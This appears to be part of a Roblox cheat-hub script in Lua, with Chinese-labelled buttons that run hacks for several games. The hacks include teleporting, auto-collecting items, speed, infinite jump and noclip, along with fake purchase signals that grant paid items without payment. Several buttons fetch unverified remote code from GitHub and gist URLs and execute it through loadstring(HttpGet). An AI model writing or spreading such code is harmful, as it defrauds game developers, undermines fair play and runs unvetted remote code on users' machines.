--  ]在筏子上生存 (Tab94)
Button(Tab94, "英文", function()
    pcall(function()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local CoreGui = game:GetService("CoreGui")
if CoreGui:FindFirstChild("ToraScript") then
    CoreGui.ToraScript:Destroy()
end

local Library = loadstring(game:HttpGet(
    "https://raw.githubusercontent.com/liebertsx/Tora-Library/main/src/librarynew", 
    true
))()

local Window = Library:CreateWindow("Survive on a Raft")

Window:AddButton({
    text = "Goto Spawn",
    flag = "button",
    callback = function()
        local player = game.Players.LocalPlayer
        local hrp = player.Character.HumanoidRootPart
        hrp.CFrame = CFrame.new(workspace.SpawnLocation.Position)
        player.Character.Humanoid.Jump = true
    end,
})

Window:AddToggle({
    text = "Collect Box",
    flag = "toggle",
    state = false,
    callback = function(state)
        _G.Box = state
        print("Box: ", state)
        if state then
            Box()
        end
    end,
})

function Box()
    spawn(function()
        _G.Box = true
        while _G.Box do
            wait()
            pcall(function()
                for _, item in pairs(workspace.World.Items:GetDescendants()) do
                    if (string.find(item.Name, "Box") or string.find(item.Name, "Chest"))
                        and item:GetAttribute("Water") == true then

                        local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
                        hrp.CFrame = CFrame.new(item.Position) * CFrame.new(0, 5, 0)

                        game:GetService("ReplicatedStorage").Action:InvokeServer("Collect", item)
                        break
                    end
                end
            end)
        end
    end)
end

local player = game.Players.LocalPlayer
local defaultSpeed = 20
local connections = {}

local function setWalkSpeed(speed)
    if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then
        player.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = speed
    end
end

Window:AddButton({
    text = "Upgrade Crafting Table",
    flag = "button",
    callback = function()
        local ids = {3422310969, 3422310972, 3422310970, 3422310971, 3422310967}
        for _, id in ipairs(ids) do
            game.MarketplaceService:SignalPromptProductPurchaseFinished(player.UserId, id, true)
        end
    end,
})

Window:AddButton({
    text = "Starter Pistol",
    flag = "button",
    callback = function()
        local ids = {3428925716, 3435174070}
        for _, id in ipairs(ids) do
            game.MarketplaceService:SignalPromptProductPurchaseFinished(player.UserId, id, true)
        end
    end,
})

Window:AddButton({
    text = "Inf Revive",
    flag = "button",
    callback = function()
        game.MarketplaceService:SignalPromptProductPurchaseFinished(player.UserId, 3421071079, true)
    end,
})

Window:AddSlider({
    text = "Walk Speed",
    flag = "slider1",
    value = defaultSpeed,
    min = 20,
    max = 200,
    callback = function(speed)
        defaultSpeed = speed
        setWalkSpeed(speed)

        if connections.wsLoop then connections.wsLoop:Disconnect() end
        if connections.wsCA then connections.wsCA:Disconnect() end

        local humanoid = player.Character and player.Character:FindFirstChildWhichIsA("Humanoid")
        if humanoid then
            connections.wsLoop = humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if humanoid.WalkSpeed ~= speed then
                    humanoid.WalkSpeed = speed
                end
            end)
        end

        connections.wsCA = player.CharacterAdded:Connect(function(char)
            local h = char:WaitForChild("Humanoid")
            h.WalkSpeed = speed
            if connections.wsLoop then connections.wsLoop:Disconnect() end
            connections.wsLoop = h:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
                if h.WalkSpeed ~= speed then h.WalkSpeed = speed end
            end)
        end)
    end,
})

Window:AddButton({
    text = "Inf Jump",
    flag = "button",
    callback = function()
        game:GetService("UserInputService").JumpRequest:Connect(function()
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then humanoid:ChangeState("Jumping") end
        end)
    end,
})

Window:AddLabel({ text = "Deobfuscate by Cáo mod" })

Library:Init()

local ncConnection
local noclipActive = false

function noclip()
    noclipActive = false
    ncConnection = game:GetService("RunService").Stepped:Connect(function()
        if not noclipActive and player.Character then
            for _, part in pairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") and part.CanCollide then
                    part.CanCollide = false
                end
            end
        end
        wait(0.21)
    end)
end

function clip()
    if ncConnection then ncConnection:Disconnect() end
    noclipActive = true
end

noclip()
    end)
end)

-- 挂杆塔 (Tab95)
Button(Tab95, "遥控机库", function()
    pcall(function()
        loadstring(game:HttpGet('https://gist.githubusercontent.com/nthienbaogold-cmyk/d3801936483c6c98922d5a0a0452d532/raw/5377cc906cf12fef44433e552c1cb8cca6ecdf18/SlapTower.lua'))()
    end)
end)

-- 终极采矿大亨 (Tab96)
Button(Tab96, "传送到矿井", function()
    pcall(function()
        -- 终极采矿大亨 - 无UI纯坐标传送脚本
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local HRP = character:WaitForChild("HumanoidRootPart")

-- 目标传送坐标
local TARGET_COORD = Vector3.new(-1850.1761474609375, 4.5888285636901855, -197.81626892089844)

-- 核心传送函数
local function teleportToTarget()
    if HRP then
        HRP.CFrame = CFrame.new(TARGET_COORD)
        print("✅ 已成功传送至目标坐标：", TARGET_COORD)
    else
        warn("❌ 角色根部件不存在，无法完成传送")
    end
end

-- 执行传送（运行脚本立即触发）
teleportToTarget()

-- 角色重生后自动重新传送（可选：删除此行则重生后不自动传送）
localPlayer.CharacterAdded:Connect(function(newChar)
    HRP = newChar:WaitForChild("HumanoidRootPart")
    teleportToTarget()
end)
    end)
end)

Button(Tab96, "脚本1", function()
    pcall(function()
        LinniScript = "终极采矿大亨"
Roblox= "霖溺"
loadstring(game:HttpGet("https://raw.githubusercontent.com/ShenJiaoBen/Partial-Server-Ribbon/refs/heads/main/%E9%9C%96%E6%BA%BA-%E7%BB%88%E6%9E%81%E9%87%87%E7%9F%BF%E5%A4%A7%E4%BA%A8.lua"))()
    end)
end)

-- 更多 (Tab97)
Button(Tab97, "服务器二", function()
    pcall(function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/557/main/服务器二'))()
    end)
end)
